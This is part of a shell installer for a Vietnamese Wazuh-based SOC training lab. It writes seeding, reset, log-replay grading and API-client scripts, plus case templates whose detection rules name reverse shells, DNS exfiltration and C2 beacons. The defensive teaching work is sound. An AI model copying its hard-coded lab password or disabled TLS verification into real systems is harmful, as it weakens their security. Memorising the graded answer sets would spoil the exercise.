    now = int(time.time())
    import seed18  # noqa: E402  (dung lai ham cai dat + flags)
    # (1) buoc CO THE LOI lam TRUOC, khi chua dung gi toi trang thai ca: indexer + luat
    ix = indexer.Indexer()
    if not ix.wait_ready(120):
        raise SystemExit("indexer chua san sang -> KHONG doi gi. Kiem tra: systemctl is-active wazuh-indexer")
    if old:
        # chi doc <= bay gio (ca moi chua ghi gi) -> chay NEN (wait_for_completion=false), khong timeout
        q = {"query": {"bool": {
            "filter": [{"range": {"timestamp": {"lte": now * 1000, "format": "epoch_millis"}}}],
            "should": [{"exists": {"field": "data.ticket"}},
                       {"range": {"timestamp": {"gte": (old - 1200) * 1000, "format": "epoch_millis"}}}],
            "minimum_should_match": 1}}}
        c, r = ix._req("POST", ix.base + "/wazuh-alerts-4.x-*/_delete_by_query?conflicts=proceed&wait_for_completion=false", q)
        print("indexer: xoa ca cu (chay nen) HTTP %s task=%s" % (c, r.get("task")))
    sh("systemctl stop lich-ca.service")
    try:
        if "--giu-luat" not in sys.argv:
            for n in seed18.LISTS:                       # list ve lai rong (bai mau co the da nap)
                open(os.path.join(seed18.OSSEC, "etc/lists", n), "w").write("lab-placeholder:\n")
            print("nap lai luat khung: %s" % seed18.install_wazuh())
    finally:
        # (2) trang thai ca: xoa + dat T0 moi NGAY (khong de lab o trang thai khong co T0)
        for n in ("events.log", "SHIFT_END", "rules-history", "rules.txt"):
            p = os.path.join(ST, n)
            if os.path.exists(p):
                os.remove(p)
        p = os.path.join(PUB, "shift.json")
        if os.path.exists(p):
            os.remove(p)
        shutil.rmtree(os.path.join(PUB, "yeu-cau"), ignore_errors=True)
        st.set_t0(int(time.time()))
        seed18.flags(T0=str(st.t0()))
        sh("systemctl start lich-ca.service")
        sh("systemctl start --no-block grade-bai18.service")
    print("T0 moi = %d (%s). Defender tu lam moi trong ~10 s." % (st.t0(), time.strftime("%H:%M:%S")))


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18"
cat > "$LAB/siem/bai18/seed18.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# seed18.py - khoi tao siem cho Bai 18. Chay BOI SYSTEMD (seed-bai18.service), root, MOT lan (marker).
#
#  1) seed ca nhan hoa (lan dau) -> /root/.bai18/{seed,t_ref}; dung lai toan bo ca bang socq.ca.build
#  2) Wazuh: request_timeout 60, <localfile> /var/log/soc-shift/*.log, luat san xuat 100310,
#     luat khung cua SV (R-B 100342/100340 - gay bao khi den gio), analysisd -t, restart (3 lan)
#  3) user API soc-tool (cong cu tren defender)
#  4) indexer: ctx-* + index pattern; nen log 2 gio truoc ca
#  5) tap AN R-A/R-B (/root/.bai18/hidden.jsonl); tap DEV (/root/.bai18/dev-*.jsonl, lich-ca giao khi den gio)
#  6) T0 = luc moi thu san sang (sau MOI lan restart cua seed) -> lich-ca bat dau ca
# Thu tu quan trong (bai hoc Lab 17): T0 dat SAU restart cuoi cung cua seed.
# ============================================================================
import calendar, glob, json, os, random, re, subprocess, sys, time

HERE = "/home/ubuntu/bai18"
sys.path.insert(0, os.path.join(HERE, "lib"))
from wzapi import Wazuh, WazuhError  # noqa: E402
from socq import ca, chain, docs, families, indexer, shift  # noqa: E402

ST = "/root/.bai18"
PUB = "/srv/shiftd"
OSSEC = "/var/ossec"
LOGDIR = "/var/log/soc-shift"
MARK = os.path.join(ST, "seeded")
# cac co seed ghi (thu tu) - chi de bao tien do cho defender
BUOC = ("PLAN", "WAZUH", "API_USER", "CTX", "RENDER", "NEN", "HIDDEN")
LOG = os.path.join(ST, "seed.log")
TOOL_USER, TOOL_PASS = "soc-tool", "Soc.Tool.2026!"
LF_MARK = "<!-- bai18-localfile -->"
LISTS = ["sao-luu-hosts", "sao-luu-ports"]       # CDB list cho ngoai le R-B (SV dien qua kiem-thu-luat)


def log(msg):
    with open(LOG, "a") as f:
        f.write("%s %s\n" % (time.strftime("%H:%M:%S"), msg))


def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)


def wui_creds():
    for p in glob.glob("/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml"):
        txt = open(p).read()
        u = re.search(r"username:\s*['\"]?([^'\"\n]+)", txt)
        pw = re.search(r"password:\s*['\"]?([^'\"\n]+)", txt)
        if u and pw:
            return u.group(1).strip(), pw.group(1).strip()
    return None, None


def wait_api(user, pw, tries=72):
    for _ in range(tries):
        try:
            api = Wazuh("https://127.0.0.1:55000", user, pw)
            api.login()
            return api
        except WazuhError:
            time.sleep(5)
    return None


def api_timeout():
    p = OSSEC + "/api/configuration/api.yaml"
    try:
        txt = open(p).read()
    except OSError:
        return
    if re.search(r"^\s*request_timeout:", txt, re.M):
        txt = re.sub(r"^(\s*request_timeout:).*$", r"\1 60", txt, flags=re.M)
    elif re.search(r"^intervals:\s*$", txt, re.M):
        txt = re.sub(r"^intervals:\s*$", "intervals:\n  request_timeout: 60", txt, count=1, flags=re.M)
    else:
        txt = txt.rstrip("\n") + "\n\nintervals:\n  request_timeout: 60\n"
    open(p, "w").write(txt)


def restart_manager():
    for i in range(3):
        cmd = "systemctl restart wazuh-manager" if i == 0 else \
              "systemctl reset-failed wazuh-manager; %s/bin/wazuh-control restart" % OSSEC
        r = sh(cmd)
        st = sh(OSSEC + "/bin/wazuh-control status").stdout
        log("restart lan %d rc=%s" % (i + 1, r.returncode))
        if "wazuh-apid is running" in st and "wazuh-analysisd is running" in st and "wazuh-logcollector is running" in st:
            return True
        time.sleep(20)
    return False


def install_wazuh():
    os.makedirs(LOGDIR, exist_ok=True)
    for h in ("web-shop", "net"):
        open(os.path.join(LOGDIR, "%s.log" % h), "a").close()
    api_timeout()
    conf = open(OSSEC + "/etc/ossec.conf").read()
    if LF_MARK not in conf:
        conf = conf.rstrip("\n") + ("\n<ossec_config>\n  %s\n  <localfile>\n    <log_format>syslog</log_format>\n"
                                    "    <location>%s/*.log</location>\n  </localfile>\n</ossec_config>\n") % (LF_MARK, LOGDIR)
        open(OSSEC + "/etc/ossec.conf", "w").write(conf)
    for n in LISTS:                                  # list rong (1 khoa gia) + khai bao trong <ruleset>
        p = os.path.join(OSSEC, "etc/lists", n)
        if not os.path.exists(p):
            open(p, "w").write("lab-placeholder:\n")
        if "etc/lists/%s<" % n not in conf:
            conf = conf.replace("<ruleset>", "<ruleset>\n    <list>etc/lists/%s</list>" % n, 1)
    open(OSSEC + "/etc/ossec.conf", "w").write(conf)
    sh("chown wazuh:wazuh %s/etc/lists/sao-luu-*" % OSSEC)
    for src, dst in (("bai18_prod_rules.xml", "bai18_prod_rules.xml"), ("local_rules_khung.xml", "local_rules.xml")):
        open(os.path.join(OSSEC, "etc/rules", dst), "w").write(open(os.path.join(HERE, src)).read())
    sh("chown wazuh:wazuh %s/etc/rules/*.xml; chmod 660 %s/etc/rules/*.xml" % (OSSEC, OSSEC))
    t = sh(OSSEC + "/bin/wazuh-analysisd -t")
    log("analysisd -t rc=%s %s" % (t.returncode, (t.stdout + t.stderr).strip()[-300:]))
    if t.returncode != 0:
        return False
    return restart_manager()


def create_tool_user(api):
    r = api._req("GET", "/security/users", params={"search": TOOL_USER})
    items = (r.get("data") or {}).get("affected_items") or []
    uid = next((it["id"] for it in items if it.get("username") == TOOL_USER), None)
    if uid is None:
        r = api._req("POST", "/security/users", body={"username": TOOL_USER, "password": TOOL_PASS})
        uid = r["data"]["affected_items"][0]["id"]
    else:
        api._req("PUT", "/security/users/%s" % uid, body={"password": TOOL_PASS})
    try:
        api._req("POST", "/security/users/%s/roles" % uid, params={"role_ids": "1"})
    except WazuhError as e:
        log("gan role: %s" % e)
    log("user API %s id=%s" % (TOOL_USER, uid))


def background(s, t_end, rng):
    """Nen ~2 gio truoc ca: web, ssh thanh cong trong noi bo, dns ngan, netmon toi dich noi bo (khong ticket)."""
    w = s["world"]
    out = []
    t = t_end - 2 * 3600
    hosts = [n for n in w.hosts if n not in ("siem",)]
    while t < t_end:
        t += rng.uniform(4, 9)
        r = rng.random()
        h = rng.choice(hosts)
        if r < 0.45:
            line = chain.lines_web_noise(t, w, rng, 1)[0]
            m = re.search(r'nginx: (\S+) .*"GET (\S+) HTTP/1.1" (\d+)', line)
            out.append(docs.alert(t, "web-shop", "100150", 3, "Web access log", ["web", "accesslog"],
                                  data={"srcip": m.group(1), "url": m.group(2), "id": m.group(3)},
                                  full_log=line, decoder="web-accesslog", program="nginx"))
        elif r < 0.7:
            st = rng.choice(w.staff)
            src = "%s.%d" % (w.subnet_ws, rng.randint(11, 249))
            line = "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (
                docs.syslog_ts(t), h, rng.randint(1000, 60000), st["user"], src, rng.randint(30000, 60000))
            out.append(docs.alert(t, h, "5715", 3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"],
                                  data={"srcip": src, "dstuser": st["user"]}, full_log=line, decoder="sshd", program="sshd"))
        elif r < 0.9:
            q = rng.choice(["www.google.com", "api.zalo.me", "update.microsoft.com", "mail.congtyx.vn", "erp.congtyx.vn"])
            line = "%s dns-01 dnsmasq[700]: query[A] %s from %s" % (docs.syslog_ts(t), q, w.ip(h))
            out.append(docs.alert(t, "dns-01", "100120", 3, "DNS query", ["dns"], data={"srcip": w.ip(h), "query": q},
                                  full_log=line, decoder="dnsmasq", program="dnsmasq"))
        else:
            dst = w.ip(rng.choice(["dns-01", "siem", "db-core", "file-01"]))
            line = "%s %s netmon: conn dst=%s port=%d proc=%s" % (docs.syslog_ts(t), h, dst, 443, "/usr/bin/curl")
            out.append(docs.alert(t, h, "100140", 3, "netmon: ket noi", ["netmon"],
                                  data={"srcip": w.ip(h), "dstip": dst, "dstport": "443", "process": {"name": "/usr/bin/curl"}},
                                  full_log=line, decoder="netmon", program="netmon"))
    return [(docs.index_name(calendar.timegm(time.strptime(d['@timestamp'][:19], '%Y-%m-%dT%H:%M:%S'))), d) for d in out]


def flags(**kv):
    st = {}
    if os.path.exists(MARK):
        for line in open(MARK):
            if "=" in line:
                k, v = line.strip().split("=", 1)
                st[k] = v
    st.update({k: v for k, v in kv.items()})
    open(MARK + ".tmp", "w").write("".join("%s=%s\n" % kv for kv in sorted(st.items())))
    os.replace(MARK + ".tmp", MARK)
    # tien do cho defender (trang-thai / watcher): chi TEN buoc da xong, khong co gia tri
    try:
        os.makedirs(PUB, exist_ok=True)
        open(os.path.join(PUB, "chuan-bi.json.tmp"), "w").write(json.dumps(
            {"xong": sorted(k for k in st if k != "T0"), "tong": len(BUOC), "t": int(time.time())}))
        os.replace(os.path.join(PUB, "chuan-bi.json.tmp"), os.path.join(PUB, "chuan-bi.json"))
    except OSError:
        pass


def main():
    os.makedirs(ST, exist_ok=True)
    os.chmod(ST, 0o700)
    os.makedirs(PUB, exist_ok=True)
    if os.path.exists(MARK) and "T0=" in open(MARK).read():
        log("da seed truoc do -> bo qua")
        return
    log("bat dau seed")
    # 1) seed ca nhan hoa (giu nguyen qua cac lan chay lai)
    if not os.path.exists(os.path.join(ST, "seed")):
        open(os.path.join(ST, "seed"), "w").write("%d\n" % random.SystemRandom().randint(1, 2 ** 31))
        open(os.path.join(ST, "t_ref"), "w").write("%d\n" % int(time.time()))
    seed = int(open(os.path.join(ST, "seed")).read())
    t_ref = int(open(os.path.join(ST, "t_ref")).read())
    s = ca.build(seed, t_ref)
    json.dump({"answers": s["answers"], "sc": s["sc"], "events": s["events"]}, open(os.path.join(ST, "plan.json"), "w"), indent=1)
    flags(PLAN="OK")
    # 2) Wazuh (cho API dashboard len truoc khi sua cau hinh - tranh restart chong luc boot)
    u, pw = wui_creds()
    if u:
        wait_api(u, pw)
    ok = install_wazuh()
    flags(WAZUH="OK" if ok else "FAIL")
    # 3) user API
    api = wait_api(u, pw) if u else None
    try:
        create_tool_user(api)
        flags(API_USER="OK")
    except Exception as e:  # noqa: BLE001
        log("user API: %s" % e)
        flags(API_USER="FAIL")
    # 4) indexer
    ix = indexer.Indexer()
    ix.wait_ready()
    try:
        for idx in ("ctx-assets", "ctx-changes", "ctx-hr"):
            ix.ensure_index(idx, indexer.CTX_MAPPING)
        n = ix.bulk(s["ctx"].as_docs(), refresh=True)
        ix.wait_dashboard()
        ix.index_pattern("ctx-star", "ctx-*")
        flags(CTX="OK n=%d" % n)
    except Exception as e:  # noqa: BLE001
        log("ctx: %s" % e)
        flags(CTX="FAIL")
    # tu kiem: render MOI ticket + bang chung vao index nhap cung mau template wazuh-alerts-* -> bat xung dot
    # kieu truong (vd data.process la object trong template) NGAY luc seed thay vi luc phat giua ca
    try:
        from socq import cases as _cases
        tmp = "wazuh-alerts-4.x-bai18selftest"
        items = []
        for eid, p in s["plans"].items():
            rr = ca.event_rng(seed, eid, "selftest")
            tk, ev = (chain.render(eid, p, t_ref, s["world"], rr) if eid.startswith("C") else _cases.render(p, t_ref, s["world"], rr))
            items += [(tmp, d) for d in ev[:20]] + [(tmp, docs.ticket(tk, "INC-000"))]
        ix.bulk(items)
        ix.delete_index(tmp)
        flags(RENDER="OK n=%d" % len(items))
    except Exception as e:  # noqa: BLE001
        log("tu kiem render: %s" % e)
        flags(RENDER="FAIL")
        ix.delete_index("wazuh-alerts-4.x-bai18selftest")
    try:
        n = ix.bulk(background(s, int(time.time()), random.Random("%s:nen" % seed)))
        flags(NEN="OK n=%d" % n)
    except Exception as e:  # noqa: BLE001
        log("nen: %s" % e)
        flags(NEN="FAIL")
    # 5) tap an + tap dev (cung the gioi)
    for hidden, name in ((True, "hidden.jsonl"), (False, None)):
        fam = families.build(s["world"], seed, hidden)
        if hidden:
            with open(os.path.join(ST, name), "w") as f:
                for sc in fam["ra"] + fam["rb"]:
                    f.write(json.dumps(sc) + "\n")
        else:
            for k in ("ra", "rb"):
                with open(os.path.join(ST, "dev-%s.jsonl" % k), "w") as f:
                    for sc in fam[k]:
                        f.write(json.dumps(sc) + "\n")
    flags(HIDDEN="OK")
    # 6) T0: sau MOI lan restart cua seed; dashboard da len
    st = shift.State(ST, PUB)
    if not st.t0():
        st.set_t0(int(time.time()))
    st.publish(s["events"])
    flags(T0=str(st.t0()))
    log("xong, T0=%s" % st.t0())
    sh("systemctl start --no-block grade-bai18.service")   # cham lan dau (khong chan lich-ca)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib"
cat > "$LAB/siem/bai18/lib/replay.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# replay.py - phat lai bo kich ban log (JSONL) qua Wazuh logtest, dem TP/FP/FN theo ho luat.
# Ha tang DUNG CHUNG (Bai 16, 17, 18). Xem README.md cung thu muc.
#
# Dinh dang moi dong JSONL:
#   {"id": "l1-m-03", "family": "l1", "label": "mal"|"benign", "variant": "...",
#    "window_s": 600, "lines": ["<dong syslog 1>", "<dong syslog 2>", ...]}
#
# Quy uoc dem (theo KICH BAN, khong theo dong log):
#   - Moi kich ban = 1 phien logtest rieng (token rieng) -> luat tan suat co trang thai trong phien.
#   - Kich ban DUONG TINH neu co >= 1 dong sinh canh bao level >= MIN_LEVEL
#     voi rule.id nam trong dai ID cua ho do.
#   - mal & duong tinh = TP ; mal & am tinh = FN ; benign & duong tinh = FP.
#   - Luat im lang hoan toan: precision = 0 (quy uoc), recall = 0.
#
# Dung:
#   replay.py --set dev.jsonl --ranges l1=100270-100279,l2=100280-100289 [--mode dev|grade|json]
# ============================================================================
import argparse, json, sys

MIN_LEVEL = 10


def load_set(path):
    out = []
    with open(path, encoding="utf-8") as f:
        for ln in f:
            ln = ln.strip()
            if ln:
                out.append(json.loads(ln))
    return out


def parse_ranges(s):
    rng = {}
    for part in (s or "").split(","):
        part = part.strip()
        if not part:
            continue
        fam, span = part.split("=")
        lo, hi = span.split("-")
        rng[fam.strip()] = (int(lo), int(hi))
    return rng


def scenario_hits(engine, sc, lo, hi, min_level=MIN_LEVEL):
    """engine(event, token) -> (token, output). Tra ve danh sach (rule_id, level) da no trong dai."""
    hits = []
    token = None
    try:
        for line in sc["lines"]:
            token, out = engine(line, token)
            rule = (out or {}).get("rule") or {}
            try:
                rid = int(rule.get("id", -1))
                lvl = int(rule.get("level", 0))
            except (TypeError, ValueError):
                continue
            if lo <= rid <= hi and lvl >= min_level:
                hits.append((rid, lvl))
    finally:
        if hasattr(engine, "close"):
            engine.close(token)
    return hits


def run(engine, scenarios, ranges):
    res = {}
    for fam, (lo, hi) in ranges.items():
        r = {"tp": 0, "fp": 0, "fn": 0, "tn": 0, "fp_ids": [], "fn_ids": [], "n_mal": 0, "n_benign": 0}
        for sc in scenarios:
            if sc.get("family") != fam:
                continue
            pos = bool(scenario_hits(engine, sc, lo, hi))
            mal = sc.get("label") == "mal"
            if mal:
                r["n_mal"] += 1
                if pos:
                    r["tp"] += 1
                else:
                    r["fn"] += 1
                    r["fn_ids"].append(sc["id"])
            else:
                r["n_benign"] += 1
                if pos:
                    r["fp"] += 1
                    r["fp_ids"].append(sc["id"])
                else:
                    r["tn"] += 1
        r["precision"] = (r["tp"] / (r["tp"] + r["fp"])) if (r["tp"] + r["fp"]) else 0.0
        r["recall"] = (r["tp"] / r["n_mal"]) if r["n_mal"] else 0.0
        res[fam] = r
    return res


class ApiEngine:
    """Bo phat lai that: goi Wazuh API /logtest."""

    def __init__(self, api):
        self.api = api

    def __call__(self, event, token):
        return self.api.logtest(event, token)

    def close(self, token):
        self.api.logtest_close(token)


def print_dev(res):
    print("%-5s %4s %4s %4s  %-9s %-6s" % ("HO", "TP", "FP", "FN", "PRECISION", "RECALL"))
    for fam, r in res.items():
        print("%-5s %4d %4d %4d  %-9.2f %-6.2f" % (fam, r["tp"], r["fp"], r["fn"], r["precision"], r["recall"]))
    for fam, r in res.items():
        if r["fp_ids"]:
            print("  [%s] kich ban BAO GIA (FP): %s" % (fam, ", ".join(r["fp_ids"])))
        if r["fn_ids"]:
            print("  [%s] kich ban BO SOT (FN): %s" % (fam, ", ".join(r["fn_ids"])))


def main():
    ap = argparse.ArgumentParser(description="Phat lai kich ban log qua Wazuh logtest")
    ap.add_argument("--set", required=True, help="file JSONL kich ban")
    ap.add_argument("--ranges", required=True, help="ho=tu-den,... vd l1=100270-100279")
    ap.add_argument("--mode", default="dev", choices=["dev", "grade", "json"])
    a = ap.parse_args()

    sys.path.insert(0, __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
    from wzapi import Wazuh
    res = run(ApiEngine(Wazuh()), load_set(a.set), parse_ranges(a.ranges))
    if a.mode == "dev":
        print_dev(res)
    elif a.mode == "json":
        print(json.dumps(res))
    else:
        for fam, r in res.items():
            print("%s_TP=%d %s_FP=%d %s_FN=%d" % (fam.upper(), r["tp"], fam.upper(), r["fp"], fam.upper(), r["fn"]))


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib"
cat > "$LAB/siem/bai18/lib/wzapi.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# wzapi.py - client toi gian cho Wazuh API (cong 55000). Chi dung thu vien chuan.
# Dung chung cho: kiem-thu-luat, thu-dong, replay.py (defender) va grade (siem).
#
# Cau hinh (bien moi truong, co mac dinh cho lab):
#   WZ_API_URL   (mac dinh https://172.20.0.20:55000)
#   WZ_API_USER  (mac dinh bai17-tool)
#   WZ_API_PASS  (mac dinh xem DEFAULT_PASS)
# ============================================================================
import base64, json, os, ssl, time, urllib.error, urllib.parse, urllib.request

DEFAULT_URL = "https://172.20.0.20:55000"
DEFAULT_USER = "soc-tool"
DEFAULT_PASS = "Soc.Tool.2026!"

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


class WazuhError(Exception):
    pass


class Wazuh:
    def __init__(self, url=None, user=None, password=None, timeout=30):
        self.url = (url or os.environ.get("WZ_API_URL") or DEFAULT_URL).rstrip("/")
        self.user = user or os.environ.get("WZ_API_USER") or DEFAULT_USER
        self.password = password or os.environ.get("WZ_API_PASS") or DEFAULT_PASS
        self.timeout = timeout
        self.token = None

    # ---------------- tang thap ----------------
    def _req(self, method, path, body=None, raw=None, ctype="application/json", auth=True, params=None, _try=0):
        url = self.url + path
        if params:
            url += "?" + urllib.parse.urlencode(params)
        data = None
        if raw is not None:
            data = raw if isinstance(raw, bytes) else raw.encode("utf-8")
        elif body is not None:
            data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Content-Type", ctype)
        if auth:
            if not self.token:
                self.login()
            req.add_header("Authorization", "Bearer " + self.token)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                txt = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            txt = e.read().decode("utf-8", "replace")
            if e.code == 401 and auth and self.token:
                # token het han -> dang nhap lai 1 lan
                self.token = None
                return self._req(method, path, body, raw, ctype, auth, params)
            if e.code == 500 and '"error": 3021' in txt and _try < 3:
                # 3021 = "Timeout executing API request": may ao qua tai, manager cham -> thu lai
                time.sleep(5 * (_try + 1))
                return self._req(method, path, body, raw, ctype, auth, params, _try + 1)
            raise WazuhError("HTTP %s %s %s: %s" % (e.code, method, path, txt[:400]))
        except Exception as e:
            raise WazuhError("%s %s: %s" % (method, path, e))
        try:
            return json.loads(txt) if txt else {}
        except ValueError:
            return {"raw": txt}

    def login(self):
        url = self.url + "/security/user/authenticate"
        req = urllib.request.Request(url, data=b"", method="POST")
        cred = base64.b64encode(("%s:%s" % (self.user, self.password)).encode()).decode()
        req.add_header("Authorization", "Basic " + cred)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                self.token = json.loads(r.read().decode())["data"]["token"]
        except urllib.error.HTTPError as e:
            raise WazuhError("Dang nhap API that bai (HTTP %s) - API chua san sang hoac sai tai khoan" % e.code)
        except Exception as e:
            raise WazuhError("Khong ket noi duoc Wazuh API %s: %s" % (self.url, e))
        return self.token

    # ---------------- ruleset ----------------
    def get_rule_file(self, name):
        r = self._req("GET", "/rules/files/" + name, params={"raw": "true"})
        return r.get("raw", "") if isinstance(r, dict) else r

    @staticmethod
    def _check_items(r, what):
        """API tra HTTP 200 ca khi KHONG ghi duoc file: loi nam trong data.failed_items."""
        d = (r or {}).get("data") or {}
        fails = d.get("failed_items") or []
        if fails or (d.get("total_affected_items") == 0 and "affected_items" in d):
            raise WazuhError("Wazuh KHONG ghi %s: %s" % (what, json.dumps(fails or r, ensure_ascii=False)[:500]))
        return r

    def put_rule_file(self, name, content):
        return self._check_items(self._req("PUT", "/rules/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    def put_list_file(self, name, content):
        return self._check_items(self._req("PUT", "/lists/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    # ---------------- manager ----------------
    def validate(self):
        """Tra ve (ok, thong_bao)."""
        r = self._req("GET", "/manager/configuration/validation")
        items = (r.get("data") or {}).get("affected_items") or []
        for it in items:
            if it.get("status") != "OK":
                return False, json.dumps(it.get("details", it), ensure_ascii=False)[:800]
        fails = (r.get("data") or {}).get("failed_items") or []
        if fails:
            return False, json.dumps(fails, ensure_ascii=False)[:800]
        return True, "OK"

    def restart(self, wait=240):
        """PUT /manager/restart chi XEP LICH restart (bat dong bo): vai giay dau /manager/status van
        bao tien trinh CU 'running' -> neu tra ve luc do, phat lai se chay tren bo luat CU.
        Phai thay manager XUONG (API mat ket noi / analysisd khong running) roi moi cho no LEN lai."""
        self._req("PUT", "/manager/restart")
        t0 = time.time()
        seen_down = False
        while time.time() - t0 < wait:
            time.sleep(3)
            try:
                self.token = None
                st = self._req("GET", "/manager/status")
                items = (st.get("data") or {}).get("affected_items") or [{}]
                up = items[0].get("wazuh-analysisd") == "running"
            except WazuhError:
                up = False
            if not up:
                seen_down = True
            elif seen_down or time.time() - t0 > 60:
                # da thay xuong roi len (hoac qua 60s ma khong bat duoc luc xuong) -> cho analysisd nap xong
                time.sleep(10)
                return True
        return False

    # ---------------- logtest ----------------
    def logtest(self, event, token=None, location="/var/log/auth.log", log_format="syslog"):
        body = {"event": event, "log_format": log_format, "location": location}
        if token:
            body["token"] = token
        r = self._req("PUT", "/logtest", body=body)
        d = r.get("data") or {}
        return d.get("token"), d.get("output") or {}

    def logtest_close(self, token):
        if not token:
            return
        try:
            self._req("DELETE", "/logtest/sessions/" + token)
        except WazuhError:
            pass
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/__init__.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# socq - thu vien dung chung cho cac lab "hang doi SOC" (Bai 0 / 14 / 18 / 19).
# Chi dung thu vien chuan Python 3. Xem README.md cung thu muc.
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/ca.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# ca.py - dung TOAN BO mot ca truc tu 1 seed (tai lap duoc): the gioi, ngu canh, hang doi, chuoi, lich, dap an.
# siem chi luu SEED (/root/.bai18/seed) va T0; moi tien trinh (seed18, lich-ca, grade18) goi build(seed, t_ref).
#   t_ref = moc thoi gian neo ngu canh (CHG/LV/OC) - lay = gio seed lan dau, LUU lai de build lai y het.
# ============================================================================
import random

from . import cases, chain, ctx as ctxmod, shift, world as worldmod


def build(seed, t_ref, scale=1.0):
    rng = random.Random(seed)
    w = worldmod.World(random.Random(rng.random()))
    cx = ctxmod.Ctx(w, t_ref)
    cx.base()
    queue = cases.plan_queue(w, cx, random.Random(rng.random()))
    ch = chain.plan(w, random.Random(rng.random()))
    events, inc = shift.make(random.Random(rng.random()), queue, scale=scale)
    plans = {}
    i = 0
    for grp in queue:
        for p in grp:
            plans["Q%d" % i] = p
            i += 1
    for k in ("C1", "C2", "C4", "C6"):
        plans[k] = ch[k]
    answers = {}
    for eid, p in plans.items():
        answers[inc[eid]] = {"V": p["V"], "P": p["P"], "E": p["E"], "pattern": p["pattern"], "src": eid,
                             "isp1": 1 if (p["V"] == 1 and p["P"] == 1) else 0}
    sc = dict(ch["SC"])
    sc["TICKETS"] = sorted(inc[k] for k in ("C1", "C2", "C4", "C6"))
    return {"seed": seed, "t_ref": t_ref, "world": w, "ctx": cx, "plans": plans, "events": events, "inc": inc,
            "answers": answers, "sc": sc}


def event_rng(seed, eid, k=0):
    """rng rieng cho moi lan render (de bu/phat lai cho ra cung noi dung)."""
    return random.Random("%s:%s:%s" % (seed, eid, k))
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/cases.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# cases.py - mau tinh huong hang doi (hop dong du lieu Bai 14, muc 4.4) - BAN TOI THIEU cho Bai 18.
#
# Hai buoc tach nhau (vi T0 cua ca chi biet SAU khi seed xong):
#   plan(...)   luc seed: chon mau, sinh tham so, ghi ngu canh (ctx), CHOT dap an (V, P, E)
#   render(...) luc phat: sinh ticket + su kien bang chung voi timestamp quanh gio phat thuc te
#
# Dap an theo SOP Bai 14:  V 1=TP 2=BTP 3=FP ;  P 1..4 (BTP/FP luon 4) ;  E so nguyen (muc 7 SOP).
# Bai 18: TP cua hang doi thuong KHONG BAO GIO la P1 (moi P1 thuoc chuoi tan cong).
#
# Khac Bai 14 (co chu dich, de chay dung o MOI gio trong ngay):
#   - T5/B4 dung luat "dang nhap tu dia chi moi" thay vi "ngoai gio"; can cu la LV / OC.
#   - bo F3 (logrotate 00:00); them M1 = beacon cua agent hop le (moi gom su co voi C4).
#   - ten nguoi dung sshd o data.dstuser (nhu Wazuh 4.14 that).
# ============================================================================
import random
import string

from . import docs

PRIO = {("A", "Cao"): 1, ("A", "TB"): 1, ("A", "Thap"): 2,
        ("B", "Cao"): 1, ("B", "TB"): 2, ("B", "Thap"): 3,
        ("C", "Cao"): 3, ("C", "TB"): 3, ("C", "Thap"): 4}

# luat "san xuat" cua cac ticket ghi thang vao indexer (khong trung dai luat cua SV 100330-100349)
R = {
    "ssh_fail":   ("5760", 5, "sshd: authentication failed.", ["syslog", "sshd", "authentication_failed"]),
    "ssh_ok":     ("5715", 3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"]),
    "ssh_brute":  ("5763", 10, "sshd: brute force trying to get access to the system. Authentication failed.",
                   ["syslog", "sshd", "authentication_failures"]),
    "new_src":    ("100111", 10, "Dang nhap thanh cong tu dia chi chua tung thay voi tai khoan nay",
                   ["syslog", "sshd", "authentication_success", "soc_login"]),
    "dns":        ("100121", 12, "Nghi tuon du lieu qua DNS (subdomain dai)", ["dns", "soc_exfil"]),
    "dns_q":      ("100120", 3, "DNS query", ["dns"]),
    "revshell":   ("100131", 12, "Nghi reverse shell (ten tien trinh khop mau)", ["audit", "soc_process"]),
    "audit_exec": ("100130", 3, "Audit: thuc thi chuong trinh", ["audit"]),
    "beacon":     ("100141", 13, "Tien trinh nguy trang ket noi ra ngoai dinh ky", ["netmon", "soc_c2"]),
    "conn":       ("100140", 3, "netmon: ket noi ra ngoai", ["netmon"]),
}

FAMILY = {"T1": "ssh", "B1": "ssh", "X1B1": "ssh", "T5": "login", "B4": "login",
          "T4": "dns", "F1": "dns", "F2": "proc", "M1": "beacon"}
